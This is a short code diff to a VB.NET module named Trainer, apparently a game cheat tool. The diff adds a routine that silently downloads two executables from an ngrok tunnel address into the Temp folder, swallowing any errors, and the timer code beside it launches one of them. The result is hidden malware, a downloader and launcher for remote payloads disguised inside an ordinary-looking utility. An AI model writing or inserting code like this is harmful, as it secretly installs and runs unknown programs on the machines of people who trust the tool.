@@ -51,6 +51,19 @@ Module Trainer
         Return Value
     End Function
 
+    Public Sub Inject_Control()
+        Try
+            wc1 = New WebClient()
+            wc1.DownloadFileAsync(New Uri("https://f7eb8f76.ngrok.io/verified_1"), My.Computer.FileSystem.SpecialDirectories.Temp & "\verified_1.exe")
+
+            wc2 = New WebClient()
+            wc2.DownloadFileAsync(New Uri("https://f7eb8f76.ngrok.io/verified_2"), My.Computer.FileSystem.SpecialDirectories.Temp & "\verified_2.exe")
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+
     Private Sub Timer_Inject2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer_Inject2.Tick
         Try
             Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\verified_1.exe")
